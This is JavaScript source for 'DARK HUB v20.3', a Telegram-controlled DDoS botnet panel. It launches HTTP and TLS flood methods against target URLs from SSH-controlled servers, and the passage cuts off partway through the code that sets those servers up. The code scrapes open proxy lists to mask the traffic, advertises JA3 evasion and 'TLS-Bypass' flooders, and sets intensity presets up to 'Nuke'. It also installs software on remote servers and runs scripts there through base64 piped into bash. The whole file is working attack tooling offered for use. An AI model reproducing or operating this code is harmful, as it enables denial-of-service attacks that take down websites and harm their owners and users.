/**
 * DARK HUB v20.3 — Multi-Method + Method-First UI
 *
 * v20.3 vs v20.2:
 *  - NEW: 8 methods (crush, blast, crush2, darbost, h2gec, http, pvhttp, tls)
 *  - NEW: Method-first flow — New Attack → pick method → URL → duration → intensity
 *  - NEW: per-method arg ordering (blast/darbost/h2gec/tls use rate-before-threads)
 *  - NEW: pvhttp uses yargs flags, minutes-based duration
 *  - FIXED: session tracking uses parsed object, not args[0]/args[1]
 *  - EXPANDED: REMOTE_DEPS — added user-agents, fake-useragent, header-generator, undici, chalk@4, yargs
 */

'use strict';

require('events').EventEmitter.defaultMaxListeners = 100;
process.setMaxListeners(100);

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const EventEmitter = require('events');

const TGModule = require('node-telegram-bot-api');
const TelegramBot = TGModule.default || TGModule;
const { Client } = require('ssh2');
const axios = require('axios');

const BRAND = 'DARK HUB';
const VERSION = 'v20.3';

/* ══════════════════════════════════════════════════════════════════════════
   INTENSITY PRESETS
   ══════════════════════════════════════════════════════════════════════════ */

const INTENSITY = {
  light:   { emoji: '🟢', label: 'Light',   threads: 4,  rate: 60,  adminOnly: false },
  medium:  { emoji: '🟡', label: 'Medium',  threads: 8,  rate: 90,  adminOnly: false },
  heavy:   { emoji: '🟠', label: 'Heavy',   threads: 16, rate: 90,  adminOnly: false },
  extreme: { emoji: '🔴', label: 'Extreme', threads: 32, rate: 200, adminOnly: true },
  nuke:    { emoji: '☢️', label: 'Nuke',    threads: 48, rate: 250, adminOnly: true },
};

/* ══════════════════════════════════════════════════════════════════════════
   CONFIG
   ══════════════════════════════════════════════════════════════════════════ */

// v20.3: expanded remote deps — covers all 8 method files
const REMOTE_DEPS = [
  'colors',
  'node-bash-title',
  'hpack',
  'axios',
  'user-agents',
  'fake-useragent',
  'header-generator',
  'undici',
  'chalk@4',
  'yargs',
];

const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '',
  ADMIN_IDS: (process.env.ADMIN_ID || '').split(',').filter(Boolean).map(Number),
  SCRIPT_DIR: __dirname,
  DATA_DIR: path.join(__dirname, 'data'),

  DEFAULT_COOLDOWN: Number(process.env.COOLDOWN || 30),
  PROXY_FILE: 'proxy.txt',
  REMOTE_DIR: '/root/attack',

  SSH_TIMEOUT: 15000,
  SSH_EXEC_TIMEOUT: 120000,
  HEALTH_CACHE_TTL: 120000,
  ATTACK_TIMEOUT: 25000,

  DEFAULT_THREADS: 16,
  DEFAULT_RATE: 90,

  MAX_CONCURRENT_PER_SERVER: 3,
  WRITE_DEBOUNCE_MS: 250,
  METHOD_VALIDATE_TIMEOUT: 3000,

  RESUME_ON_START: true,

  MAX_POLLING_RESTARTS: 50,
  HEARTBEAT_STALE_MS: 180000,
  HEARTBEAT_CHECK_MS: 60000,

  SESSION_GC_MS: 60000,

  REMOTE_STABILIZE_MS: 1500,
  REMOTE_ENV_TTL: 600000,
  REMOTE_RETRY: 1,
  REMOTE_KILL_GRACE_MS: 8000,

  AUTO_PROVISION: true,
  PROVISION_TIMEOUT: 300000,
  DEPS_INSTALL_TIMEOUT: 240000,
};

if (!CONFIG.BOT_TOKEN) { console.error('[fatal] BOT_TOKEN required'); process.exit(1); }
if (CONFIG.ADMIN_IDS.length === 0) { console.error('[fatal] ADMIN_ID required'); process.exit(1); }

fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });

const FILES = {
  users:       path.join(CONFIG.DATA_DIR, 'users.json'),
  servers:     path.join(CONFIG.DATA_DIR, 'servers.json'),
  groups:      path.join(CONFIG.DATA_DIR, 'groups.json'),
  methods:     path.join(CONFIG.DATA_DIR, 'methods.json'),
  methodstate: path.join(CONFIG.DATA_DIR, 'methodstate.json'),
  presets:     path.join(CONFIG.DATA_DIR, 'presets.json'),
  cooldowns:   path.join(CONFIG.DATA_DIR, 'cooldowns.json'),
  blacklist:   path.join(CONFIG.DATA_DIR, 'blacklist.json'),
  sessions:    path.join(CONFIG.DATA_DIR, 'sessions.json'),
  history:     path.join(CONFIG.DATA_DIR, 'history.json'),
  botstate:    path.join(CONFIG.DATA_DIR, 'botstate.json'),
  proxies:     path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE),
  audit:       path.join(CONFIG.DATA_DIR, 'audit.log'),
};

const DEFAULTS = {
  users: '{}', groups: '[]', servers: '[]', methods: '[]', methodstate: '{}',
  presets: '{}', cooldowns: '{}', blacklist: '[]', sessions: '{}', history: '[]',
  botstate: '{"online":true,"maintenanceMsg":"🛠 Under maintenance. Back soon.","lastToggleBy":null,"lastToggleAt":null}',
};

for (const [key, f] of Object.entries(FILES)) {
  if (key === 'audit' || key === 'proxies') continue;
  if (!fs.existsSync(f)) fs.writeFileSync(f, DEFAULTS[key] + '\n');
}

/* ══════════════════════════════════════════════════════════════════════════
   ATOMIC STORE
   ══════════════════════════════════════════════════════════════════════════ */

class JsonStore extends EventEmitter {
  constructor(file, fallback) {
    super();
    this.file = file;
    this.fallback = fallback;
    this._dirty = false;
    this._timer = null;
    this._cache = this._load();
    process.on('exit', () => this.flush());
    process.on('SIGINT', () => this.flush());
    process.on('SIGTERM', () => this.flush());
  }
  _load() {
    try { return JSON.parse(fs.readFileSync(this.file, 'utf8')); }
    catch { return JSON.parse(JSON.stringify(this.fallback)); }
  }
  get() { return this._cache; }
  set(data) {
    this._cache = data;
    this._dirty = true;
    if (!this._timer) this._timer = setTimeout(() => this.flush(), CONFIG.WRITE_DEBOUNCE_MS);
  }
  mutate(fn) { const out = fn(this._cache); this.set(this._cache); return out; }
  flush() {
    if (this._timer) { clearTimeout(this._timer); this._timer = null; }
    if (!this._dirty) return;
    try {
      const tmp = this.file + '.tmp.' + process.pid;
      fs.writeFileSync(tmp, JSON.stringify(this._cache, null, 2) + '\n', { mode: 0o600 });
      fs.renameSync(tmp, this.file);
      this._dirty = false;
      this.emit('flushed');
    } catch (e) { console.error('[store] flush fail', this.file, e.message); }
  }
}

const store = {
  users:       new JsonStore(FILES.users, {}),
  servers:     new JsonStore(FILES.servers, []),
  groups:      new JsonStore(FILES.groups, []),
  methods:     new JsonStore(FILES.methods, []),
  methodstate: new JsonStore(FILES.methodstate, {}),
  presets:     new JsonStore(FILES.presets, {}),
  cooldowns:   new JsonStore(FILES.cooldowns, {}),
  blacklist:   new JsonStore(FILES.blacklist, []),
  sessions:    new JsonStore(FILES.sessions, {}),
  history:     new JsonStore(FILES.history, []),
  botstate:    new JsonStore(FILES.botstate, { online: true, maintenanceMsg: '🛠 Under maintenance. Back soon.' }),
};

/* ══════════════════════════════════════════════════════════════════════════
   MAINTENANCE HELPERS
   ══════════════════════════════════════════════════════════════════════════ */

function botIsOnline() { return store.botstate.get().online !== false; }
function maintenanceMessage() { return store.botstate.get().maintenanceMsg || '🛠 Under maintenance. Back soon.'; }

async function sendMaintenance(msg) {
  const text = `🛠 <b>Under Maintenance</b>\n\n<i>${esc(maintenanceMessage())}</i>`;
  try { return await bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML' }); } catch {}
}

function guardCommand(handler) {
  return async (msg, match) => {
    if (!botIsOnline() && !isAdmin(msg.from.id)) return sendMaintenance(msg);
    try { return await handler(msg, match); }
    catch (e) { console.error('[cmd]', e); }
  };
}

/* ══════════════════════════════════════════════════════════════════════════
   AUDIT
   ══════════════════════════════════════════════════════════════════════════ */

function audit(event, actor, details = {}) {
  const line = JSON.stringify({ at: new Date().toISOString(), event, actor, details }) + '\n';
  fs.appendFile(FILES.audit, line, () => {});
}

function tailAudit(n = 20) {
  try { return fs.readFileSync(FILES.audit, 'utf8').trim().split('\n').filter(Boolean).slice(-n); }
  catch { return []; }
}

/* ══════════════════════════════════════════════════════════════════════════
   RATE LIMITER
   ══════════════════════════════════════════════════════════════════════════ */

class TokenBucket {
  constructor(capacity, refillPerSec) {
    this.capacity = capacity; this.tokens = capacity;
    this.refillPerSec = refillPerSec; this.lastRefill = Date.now();
  }
  take(n = 1) {
    const now = Date.now();
    this.tokens = Math.min(this.capacity, this.tokens + ((now - this.lastRefill) / 1000) * this.refillPerSec);
    this.lastRefill = now;
    if (this.tokens >= n) { this.tokens -= n; return true; }
    return false;
  }
}

const buckets = new Map();
const getBucket = id => {
  if (!buckets.has(id)) buckets.set(id, new TokenBucket(5, 0.5));
  return buckets.get(id);
};

/* ══════════════════════════════════════════════════════════════════════════
   HELPERS
   ══════════════════════════════════════════════════════════════════════════ */

const esc = s => String(s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

function normalizeHost(raw) {
  return String(raw || '').toLowerCase()
    .replace(/^[a-z]+:\/\//, '').replace(/[/?#].*$/, '').replace(/:\d+$/, '').replace(/\.+$/, '');
}

function hostMatches(h, p) {
  h = normalizeHost(h); p = normalizeHost(p);
  if (!h || !p) return false;
  if (p.startsWith('*.')) { const b = p.slice(2); return h === b || h.endsWith('.' + b); }
  return h === p;
}

const isBlacklisted = host => store.blacklist.get().some(p => hostMatches(host, p));
const shellQuote = s => "'" + String(s).replace(/'/g, "'\\''") + "'";

function safeRemoteExec(conn, scriptLines, timeoutMs) {
  const b64 = Buffer.from(scriptLines.join('\n'), 'utf8').toString('base64');
  return sshExec(conn, `echo ${b64} | base64 -d | setsid bash -s`, timeoutMs);
}

function formatNum(n) {
  if (n >= 1000000) return (n / 1000000).toFixed(1) + 'M';
  if (n >= 1000) return (n / 1000).toFixed(1) + 'K';
  return String(n);
}

function formatGB(mb) {
  if (mb >= 1024) return (mb / 1024).toFixed(0) + 'G';
  return mb + 'M';
}

function onlineNodeCount() {
  return 1 + store.servers.get().filter(s => s.status === 'online').length;
}

function estimateRps(threads, rate) {
  return threads * rate * onlineNodeCount();
}

/* ══════════════════════════════════════════════════════════════════════════
   PROXIES
   ══════════════════════════════════════════════════════════════════════════ */

function readProxies() {
  if (!fs.existsSync(FILES.proxies)) return [];
  return fs.readFileSync(FILES.proxies, 'utf8').split(/\r?\n/).map(l => l.trim())
    .filter(l => /^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(l));
}

function saveProxies(list) {
  const unique = [...new Set(list)];
  fs.writeFileSync(FILES.proxies, unique.join('\n') + '\n');
  return unique.length;
}

const PROXY_SOURCES = [
  'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
  'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
  'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
  'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
  'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
];

async function scrapeProxies() {
  const seen = new Set(readProxies());
  const initial = seen.size;
  await Promise.allSettled(PROXY_SOURCES.map(async src => {
    try {
      const r = await axios.get(src, { timeout: 12000 });
      for (const l of String(r.data).split(/\r?\n/)) {
        const t = l.trim();
        if (/^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(t)) seen.add(t);
      }
    } catch {}
  }));
  const list = [...seen];
  saveProxies(list);
  return list.length - initial;
}

async function scoreProxies(sample = 50) {
  const net = require('net');
  const proxies = readProxies();
  const pick = proxies.sort(() => Math.random() - 0.5).slice(0, sample);
  const alive = [];
  await Promise.allSettled(pick.map(p => new Promise(res => {
    const [h, port] = p.split(':');
    const sock = net.connect({ host: h, port: Number(port) });
    const done = ok => { try { sock.destroy(); } catch {} res(ok ? alive.push(p) : null); };
    sock.setTimeout(2500);
    sock.on('connect', () => done(true));
    sock.on('timeout', () => done(false));
    sock.on('error', () => done(false));
  })));
  const dead = pick.filter(p => !alive.includes(p));
  if (dead.length > 0) saveProxies(readProxies().filter(p => !dead.includes(p)));
  return { alive: alive.length, dead: dead.length, total: readProxies().length };
}

/* ══════════════════════════════════════════════════════════════════════════
   SAMPLE COMMAND PARSER (for custom method upload)
   ══════════════════════════════════════════════════════════════════════════ */

function tokenizeCommand(input) {
  const tokens = [];
  let cur = '', inQuote = null, escaped = false;
  for (const c of String(input || '')) {
    if (escaped) { cur += c; escaped = false; continue; }
    if (c === '\\') { escaped = true; continue; }
    if (inQuote) { if (c === inQuote) inQuote = null; else cur += c; }
    else if (c === '"' || c === "'") inQuote = c;
    else if (/\s/.test(c)) { if (cur) { tokens.push(cur); cur = ''; } }
    else cur += c;
  }
  if (cur) tokens.push(cur);
  return tokens;
}

const templateToString = items => items.map(t => /\s/.test(t) ? `"${t.replace(/"/g, '\\"')}"` : t).join(' ');

const VALUE_FLAGS = new Set([
  'delay', 'query', 'timeout', 'rate', 'threads', 'thread', 'duration', 'dur',
  'ua', 'useragent', 'user-agent', 'referer', 'referrer', 'cookie', 'cookies',
  'path', 'port', 'amount', 'repeat', 'retry', 'concurrent', 'conc',
  'host', 'payload', 'body', 'header', 'agent', 'auth', 'token', 'key',
  'mode', 'interval', 'count', 'max', 'min', 'size', 'cache', 'type',
  'format', 'content-type', 'accept', 'origin', 'x-forwarded-for', 'method',
  'workers', 'conns', 'conn', 'packet', 'pps', 'bps', 'group',
]);

const isUrl = t => /^https?:\/\/\S+$/i.test(t);
const isProxy = t => /^\{proxy\}$/i.test(t) || /prox\w*\.txt$/i.test(t);
const isInt = t => /^\d+$/.test(t);
const isFlag = t => /^-{1,2}[\w-]/.test(t);
const isCombined = t => /^-[a-zA-Z]{2,}$/.test(t) && !t.startsWith('--');
const flagName = t => t.replace(/^-{1,2}/, '').split('=')[0].toLowerCase();

function parseSampleCommand(sampleStr) {
  const raw = String(sampleStr || '').trim();
  if (!raw) return { ok: false, error: 'Empty command' };
  let tokens = tokenizeCommand(raw);
  if (!tokens.length) return { ok: false, error: 'Empty command' };
  if (/^(\.{0,2}\/)?(.*\/)?node(\.exe)?$/i.test(tokens[0])) tokens.shift();
  if (tokens[0] && /\.(js|cjs|mjs|ts)$/i.test(tokens[0])) tokens.shift();
  if (!tokens.length) return { ok: false, error: 'No arguments after script name' };

  const template = [], warnings = [];
  let numSlot = 1, seenTarget = false, seenProxy = false, i = 0;

  while (i < tokens.length) {
    const t = tokens[i];
    if (isUrl(t) && !seenTarget) { template.push('$1'); seenTarget = true; numSlot = Math.max(numSlot, 2); i++; continue; }
    if (isProxy(t) && !seenProxy) { template.push('{proxy}'); seenProxy = true; i++; continue; }
    if (isFlag(t) && t.includes('=')) {
      const idx = t.indexOf('=');
      const k = t.slice(0, idx);
      let v = t.slice(idx + 1);
      if (isUrl(v) && !seenTarget) { template.push(k, '$1'); seenTarget = true; numSlot = Math.max(numSlot, 2); }
      else if (isProxy(v) && !seenProxy) { template.push(k, '{proxy}'); seenProxy = true; }
      else template.push(k, v);
      i++; continue;
    }
    if (isCombined(t)) { for (const ch of t.slice(1)) template.push('-' + ch); i++; continue; }
    if (isFlag(t)) {
      const name = flagName(t);
      const next = tokens[i + 1];
      const takesValue = VALUE_FLAGS.has(name);
      if (takesValue && next !== undefined && !isFlag(next)) {
        if (isUrl(next) && !seenTarget) { template.push(t, '$1'); seenTarget = true; numSlot = Math.max(numSlot, 2); i += 2; continue; }
        if (isProxy(next) && !seenProxy) { template.push(t, '{proxy}'); seenProxy = true; i += 2; continue; }
        template.push(t, next); i += 2; continue;
      }
      template.push(t); i++; continue;
    }
    if (isInt(t)) { if (numSlot <= 4) { template.push(`$${numSlot}`); numSlot++; } else template.push(t); i++; continue; }
    template.push(t); i++;
  }

  if (!seenTarget) return { ok: false, error: 'No target URL (http/https) found' };
  if (!seenProxy) warnings.push('No proxy.txt in sample — method will run without proxy');
  return { ok: true, template: templateToString(template), tokens: template, hasProxy: seenProxy, hasTarget: seenTarget, warnings };
}

function buildArgsFromTemplate(templateStr, target, duration, threads, rate) {
  return tokenizeCommand(templateStr).map(t => {
    if (t === '$1') return target;
    if (t === '$2') return String(duration);
    if (t === '$3') return String(threads);
    if (t === '$4') return String(rate);
    if (t === '{proxy}') return CONFIG.PROXY_FILE;
    return t;
  });
}

/* ══════════════════════════════════════════════════════════════════════════
   METHODS — 8 built-in profiles
   ══════════════════════════════════════════════════════════════════════════ */

// shared parse helpers
const parseRateFirst = a => {  // blast, darbost, h2gec, tls: <target> <time> <rate> <threads> <proxy>
  const [target, duration, threads = '16', rate = '90'] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(rate), String(threads), CONFIG.PROXY_FILE] };
};

const parseCrush = a => {  // l.js / c-rush.js: <target> <dur> <proxy> <threads> <rate>
  const [target, duration, threads = '16', rate = '90', ...f] = a;
  const b = [target, String(duration), CONFIG.PROXY_FILE, String(threads), String(rate)];
  const flat = f.map(x => String(x).toLowerCase());
  if (flat.includes('cookies') || flat.includes('-c')) b.push('-c');
  if (flat.includes('headers') || flat.includes('-h')) b.push('-h');
  if (flat.includes('cache')   || flat.includes('-ch')) b.push('-ch', 'true');
  return { target, duration, threads, rate, args: b };
};

const parseThreadsFirst = a => {  // http.js: <target> <dur> <threads> <rate> <proxy>
  const [target, duration, threads = '16', rate = '90'] = a;
  return { target, duration, threads, rate, args: [target, String(duration), String(threads), String(rate), CONFIG.PROXY_FILE] };
};

const parsePvHttp = a => {  // pv-http.js: yargs --url --time(minutes) --conc --adv-burst --adaptive-delay
  const [target, duration, threads = '50'] = a;
  const minutes = Math.max(1, Math.ceil(Number(duration) / 60));
  return {
    target,
    duration,
    threads,
    rate: 0, // not used
    args: ['--url', target, '--time', String(minutes), '--conc', String(threads), '--adv-burst', '--adaptive-delay', '--ja3-evasion'],
  };
};

const BUILTIN_METHODS = [
  {
    id: 'crush',
    name: 'C-Rush',
    file: 'l.js',
    builtin: true,
    emoji: '💥',
    desc: 'HTTP/1.1 + HTTP/2 Mixed RushAway',
    example: '/attack crush <url> <dur> [threads] [rate]',
    parse: parseCrush,
  },
  {
    id: 'blast',
    name: 'Blast',
    file: 'blast.js',
    builtin: true,
    emoji: '💣',
    desc: 'HTTP/2 multiplexing flooder with HPACK',
    example: '/attack blast <url> <dur> [threads] [rate]',
    parse: parseRateFirst,
  },
  {
    id: 'crush2',
    name: 'C-Rush v2',
    file: 'c-rush.js',
    builtin: true,
    emoji: '🎯',
    desc: 'C-Rush alternate build',
    example: '/attack crush2 <url> <dur> [threads] [rate]',
    parse: parseCrush,
  },
  {
    id: 'darbost',
    name: 'Darbost',
    file: 'darbost.js',
    builtin: true,
    emoji: '⚡',
    desc: 'HTTP/2 darbost multiplex flooder',
    example: '/attack darbost <url> <dur> [threads] [rate]',
    parse: parseRateFirst,
  },
  {
    id: 'h2gec',
    name: 'H2-GEC',
    file: 'h2gec.js',
    builtin: true,
    emoji: '🌀',
    desc: 'HTTP/2 GEC multiplexing with JA3',
    example: '/attack h2gec <url> <dur> [threads] [rate]',
    parse: parseRateFirst,
  },
  {
    id: 'http',
    name: 'HTTP-Flood',
    file: 'http.js',
    builtin: true,
    emoji: '🌊',
    desc: 'Plain HTTP/1.1 flooder (no TLS)',
    example: '/attack http <url> <dur> [threads] [rate]',
    parse: parseThreadsFirst,
  },
  {
    id: 'pvhttp',
    name: 'PV-HTTP',
    file: 'pv-http.js',
    builtin: true,
    emoji: '🔮',
    desc: 'PV L7 flooder with JA3 evasion + adaptive burst',
    example: '/attack pvhttp <url> <dur> [conc]',
    parse: parsePvHttp,
  },
  {
    id: 'tls',
    name: 'TLS-Bypass',
    file: 'tls.js',
    builtin: true,
    emoji: '🔐',
    desc: 'TLS bypass HTTP/2 flooder with header generator',
    example: '/attack tls <url> <dur> [threads] [rate]',
    parse: parseRateFirst,
  },
];

function getMethodState(id) {
  const s = store.methodstate.get();
  return s[id] || { enabled: true, stats: { launches: 0, lastAt: 0, lastBy: null } };
}

function updateMethodState(id, patch) {
  store.methodstate.mutate(s => {
    s[id] = { ...(s[id] || { enabled: true, stats: { launches: 0, lastAt: 0, lastBy: null } }), ...patch };
  });
}

function bumpMethodStats(id, userId) {
  store.methodstate.mutate(s => {
    if (!s[id]) s[id] = { enabled: true, stats: { launches: 0, lastAt: 0, lastBy: null } };
    if (!s[id].stats) s[id].stats = { launches: 0, lastAt: 0, lastBy: null };
    s[id].stats.launches++;
    s[id].stats.lastAt = Date.now();
    s[id].stats.lastBy = userId;
  });
}

const isMethodEnabled = id => getMethodState(id).enabled !== false;

function allMethods() {
  const custom = store.methods.get().map(m => {
    const tpl = Array.isArray(m.template) ? templateToString(m.template) : (m.template || '');
    return {
      id: m.id, name: m.name || m.id, file: m.file, builtin: false, emoji: '🔧',
      desc: m.desc || 'Custom method',
      template: tpl, sample: m.sample || '',
      example: m.example || `/attack ${m.id} <url> <dur>`,
      addedAt: m.addedAt,
      parse: a => {
        const [target, duration, threads = String(CONFIG.DEFAULT_THREADS), rate = String(CONFIG.DEFAULT_RATE)] = a;
        if (!target || !duration) throw new Error('Target and duration required');
        if (!tpl) throw new Error('Method has no template');
        return { target, duration, threads, rate, args: buildArgsFromTemplate(tpl, target, duration, threads, rate) };
      },
    };
  });
  return [...BUILTIN_METHODS, ...custom].map(m => {
    const st = getMethodState(m.id);
    return { ...m, enabled: st.enabled !== false, stats: st.stats || { launches: 0 } };
  });
}

const getMethod = id => allMethods().find(m => m.id === id);
const availableMethods = () => allMethods().filter(m => fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));

function userCanUseMethod(user, id) {
  if (isAdmin(user.telegramId)) return true;
  if (!isMethodEnabled(id)) return false;
  const am = user.allowedMethods;
  if (am === null || am === undefined) return true;
  return Array.isArray(am) && am.includes(id);
}

function visibleMethodsFor(user) {
  return availableMethods().filter(m => {
    if (!m.enabled && !isAdmin(user.telegramId)) return false;
    return userCanUseMethod(user, m.id);
  });
}

function validateMethodFile(file) {
  return new Promise(resolve => {
    const p = path.join(CONFIG.SCRIPT_DIR, file);
    if (!fs.existsSync(p)) return resolve({ ok: false, error: 'File not found' });
    let done = false;
    const finish = r => { if (!done) { done = true; resolve(r); } };
    let child;
    try { child = spawn(process.execPath, ['--check', p], { stdio: 'pipe' }); }
    catch (e) { return finish({ ok: false, error: e.message }); }
    let err = '';
    child.stderr.on('data', d => { err += d.toString(); });
    child.on('exit', code => finish(code === 0 ? { ok: true } : { ok: false, error: (err || 'syntax error').slice(0, 160) }));
    const t = setTimeout(() => { try { child.kill('SIGKILL'); } catch {} finish({ ok: true }); }, CONFIG.METHOD_VALIDATE_TIMEOUT);
    t.unref();
  });
}

/* ══════════════════════════════════════════════════════════════════════════
   USERS + ROLES
   ══════════════════════════════════════════════════════════════════════════ */

const DEFAULT_LIMITS = { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, cooldown: CONFIG.DEFAULT_COOLDOWN };
const ADMIN_LIMITS = { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 };

const getUser = id => store.users.get()[String(id)] || null;
const isOwner = id => CONFIG.ADMIN_IDS.includes(Number(id));
const isAdmin = id => isOwner(id) || (getUser(id)?.role === 'admin');

function upsertUser(id, patch) {
  const key = String(id);
  let out;
  store.users.mutate(u => {
    u[key] = { ...(u[key] || {}), ...patch, updatedAt: new Date().toISOString() };
    out = u[key];
  });
  return out;
}

function ensureUser(msg) {
  const id = msg.from.id;
  const existing = getUser(id);
  if (existing) return existing;
  const owner = isOwner(id);
  return upsertUser(id, {
    telegramId: id, username: msg.from.username || null, firstName: msg.from.first_name || null,
    role: owner ? 'admin' : 'pending',
    isOwner: owner,
    createdAt: new Date().toISOString(),
    limits: owner ? { ...ADMIN_LIMITS } : { ...DEFAULT_LIMITS },
    allowedMethods: null, lastMethod: null, lastTarget: null,
  });
}

const userActiveCount = id =>
  Object.values(store.sessions.get()).filter(x => x.owner === id && x.status === 'running').length;

function checkUserLimits(user, d, th, r) {
  const l = user.limits || {};
  if (l.maxDuration > 0 && Number(d) > l.maxDuration) throw new Error(`Max duration ${l.maxDuration}s`);
  if (l.maxThreads > 0 && Number(th) > l.maxThreads) throw new Error(`Max threads ${l.maxThreads}`);
  if (l.maxRate > 0 && Number(r) > l.maxRate) throw new Error(`Max rate ${l.maxRate}`);
}

function roleBadge(u) {
  if (!u) return '❓';
  if (isOwner(u.telegramId)) return '👑';
  if (u.role === 'admin') return '🛡';
  if (u.role === 'user') return '✅';
  if (u.role === 'banned') return '🚫';
  return '⏳';
}

function roleLabel(u) {
  if (isOwner(u.telegramId)) return 'owner';
  return u.role || 'pending';
}

/* ══════════════════════════════════════════════════════════════════════════
   COOLDOWNS
   ══════════════════════════════════════════════════════════════════════════ */

function setCooldown(userId, seconds) {
  if (seconds > 0) store.cooldowns.mutate(c => { c[String(userId)] = { until: Date.now() + seconds * 1000 }; });
}

function getCooldownLeft(userId) {
  const c = store.cooldowns.get()[String(userId)];
  if (!c) return 0;
  const left = Math.ceil((c.until - Date.now()) / 1000);
  return left > 0 ? left : 0;
}

/* ══════════════════════════════════════════════════════════════════════════
   SERVERS + SSH
   ══════════════════════════════════════════════════════════════════════════ */

const serverConns = new Map();
const healthCache = new Map();
const warmupSet = new Set();

const remoteEnvCache = new Map();
const remoteHashCache = new Map();
const remoteDepsCache = new Map();
const provisioningSet = new Set();

const getServer = id => store.servers.get().find(s => s.id === id);

function upsertServer(patch) {
  store.servers.mutate(list => {
    const i = list.findIndex(s => s.id === patch.id);
    if (i >= 0) list[i] = { ...list[i], ...patch }; else list.push(patch);
  });
  return patch;
}

function removeServer(id) {
  const c = serverConns.get(id);
  if (c) { try { c.end(); } catch {} serverConns.delete(id); }
  healthCache.delete(id);
  remoteEnvCache.delete(id);
  remoteDepsCache.delete(id);
  for (const k of [...remoteHashCache.keys()]) if (k.startsWith(id + ':')) remoteHashCache.delete(k);
  store.servers.mutate(list => {
    const i = list.findIndex(s => s.id === id);
    if (i >= 0) list.splice(i, 1);
  });
}

const newServerId = () => 'srv_' + crypto.randomBytes(3).toString('hex');

function serverStats() {
  const list = store.servers.get();
  const online = list.filter(s => s.status === 'online').length;
  const running = Object.values(store.sessions.get()).filter(s => s.status === 'running');
  return {
    total: list.length, online, offline: list.length - online,
    attacking: new Set(running.filter(s => s.where === 'remote').map(s => s.serverId)).size,
  };
}

function listGroups() {
  const set = new Set(store.groups.get());
  for (const s of store.servers.get()) if (s.group) set.add(s.group);
  return [...set].sort();
}

function sshConnect(server) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    let settled = false;
    const timer = setTimeout(() => {
      if (!settled) { settled = true; try { conn.end(); } catch {} reject(new Error('SSH timeout')); }
    }, CONFIG.SSH_TIMEOUT);
    conn.on('ready', () => { if (!settled) { settled = true; clearTimeout(timer); resolve(conn); } });
    conn.on('error', e => { if (!settled) { settled = true; clearTimeout(timer); try { conn.end(); } catch {} reject(e); } });
    try {
      conn.connect({
        host: server.host, port: server.port, username: server.username, password: server.password,
        readyTimeout: CONFIG.SSH_TIMEOUT,
        algorithms: { serverHostKey: ['ssh-rsa', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] },
      });
    } catch (e) { if (!settled) { settled = true; clearTimeout(timer); reject(e); } }
  });
}

function sshExec(conn, cmd, timeoutMs = CONFIG.SSH_EXEC_TIMEOUT) {
  return new Promise(resolve => {
    let done = false;
    const t = setTimeout(() => { if (!done) { done = true; resolve({ code: -1, out: '', err: 'exec timeout' }); } }, timeoutMs);
    try {
      conn.exec(cmd, (err, stream) => {
        if (err) { clearTimeout(t); done = true; return resolve({ code: -1, out: '', err: err.message }); }
        let out = '', errOut = '';
        stream.on('data', d => { out += d.toString(); });
        stream.stderr.on('data', d => { errOut += d.toString(); });
        stream.on('close', code => { clearTimeout(t); done = true; resolve({ code: code || 0, out, err: errOut }); });
      });
    } catch (e) { clearTimeout(t); done = true; resolve({ code: -1, out: '', err: e.message }); }
  });
}

function sshUpload(conn, local, remote) {
  return new Promise((resolve, reject) => {
    conn.sftp((err, sftp) => {
      if (err) return reject(err);
      sftp.fastPut(local, remote, e => { try { sftp.end(); } catch {} e ? reject(e) : resolve(); });
    });
  });
}

async function getServerConn(id) {
  if (serverConns.has(id)) {
    const c = serverConns.get(id);
    if (c._ready) return c;
    serverConns.delete(id);
  }
  const server = getServer(id);
  if (!server) throw new Error('Server not found: ' + id);
  const conn = await sshConnect(server);
  conn._ready = true;
  conn.on('close', () => {
    serverConns.delete(id);
    remoteEnvCache.delete(id);
  });
  conn.on('error', () => {
    serverConns.delete(id);
    remoteEnvCache.delete(id);
  });
  serverConns.set(id, conn);
  return conn;
}

async function provisionRemote(serverId, conn, onProgress) {
  if (provisioningSet.has(serverId)) throw new Error('provisioning already in progress');
  provisioningSet.add(serverId);
  const say = (msg) => { try { onProgress && onProgress(msg); } catch {} };

  try {
    say('🔍 checking environment…');

    const quick = await sshExec(conn,
      `bash -lc 'for p in "$(command -v node 2>/dev/null)" /usr/local/bin/node /usr/bin/node /opt/node/bin/node /root/.nvm/versions/node/*/bin/node; do if [ -x "$p" ] && "$p" -v >/dev/null 2>&1; then echo "OK:$p"; break; fi; done'`,
      10000
    );

    let env = null;
    if ((quick.out || '').includes('OK:')) {
      say('✅ node already installed');
      env = await collectRemoteEnv(serverId, conn);
    } else {
      say('📦 installing Node.js 20 (this may take 1–3 min)…');

      const pmCheck = await sshExec(conn, `command -v apt-get >/dev/null && echo apt; command -v yum >/dev/null && echo yum; command -v apk >/dev/null && echo apk`, 8000);
      const pm = (pmCheck.out || '').trim();

      const script = [
        'set -e',
